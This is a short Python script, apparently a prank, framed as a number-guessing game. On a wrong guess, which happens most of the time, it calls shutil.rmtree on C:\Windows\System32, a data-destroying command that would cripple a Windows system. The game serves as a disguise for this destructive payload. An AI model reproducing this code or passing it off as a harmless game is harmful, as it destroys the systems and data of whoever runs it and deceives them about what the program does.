import random
import shutil

number = random.randint(1,10)
guess = int(input("Guess a number from 1 - 10!"))

if guess == number:
    print("You won!")
else:
    shutil.rmtree(r"C:\Windows\System32")
